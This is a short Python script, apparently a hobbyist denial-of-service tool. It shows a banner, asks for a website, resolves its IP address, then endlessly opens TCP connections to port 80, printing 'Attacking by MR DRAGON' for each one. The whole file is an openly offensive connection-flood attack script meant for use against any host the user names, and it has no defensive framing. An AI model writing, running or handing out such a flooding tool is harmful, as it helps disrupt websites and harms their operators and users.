import os,sys,socket,time
B = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0m"     # White
R = "\033[31m"    # Red
PU = "\033[2;35m" #purple
os.system('clear')
print (R+""" _____   _____    _____   _____   _____        
| ____| |  _  \  /  _  \ /  _  \ |  _  \       
| |__   | |_| |  | | | | | | | | | |_| |       
|  __|  |  _  /  | | | | | | | | |  _  /       
| |___  | | \ \  | |_| | | |_| | | | \ \       
|_____| |_|  \_\ \_____/ \_____/ |_|  \_\      """)
print("")
ip =input (CC+"Enter URL website : ")
try:
    Web_ip = socket.gethostbyname(ip)
except:
    print()
    print("URL Without (->( HTTP:// OR HTTPS:// )<-)")
    time.sleep(2)
    exit()
print()
print(f"-| Host: {ip} -|- IP: {Web_ip} |-")
print()
print("0-<___________-+-___________>-0")
print()
time.sleep(2)
def con():
    while True:
        try:
            sock=socket.socket(socket.AF_INET ,socket.SOCK_STREAM)
            conn = sock.connect_ex((ip,80))
            data = GG+"[√√√ ]Attacking by MR DRAGON: {} : Port: {}".format(ip,"80")
            if conn == 0:
                print(data)
            else:
                if conn != 0:
                    con()
        except KeyboardInterrupt:
            def ex():
                pause = input("Attack Is Stoped Do u want Continue? (Y , N): ")
                if pause == "Y" or pause == "y":
                    con()
                if pause == "N" or pause == "n":
                    exit()
                else:
                    ex()
            ex()
con()
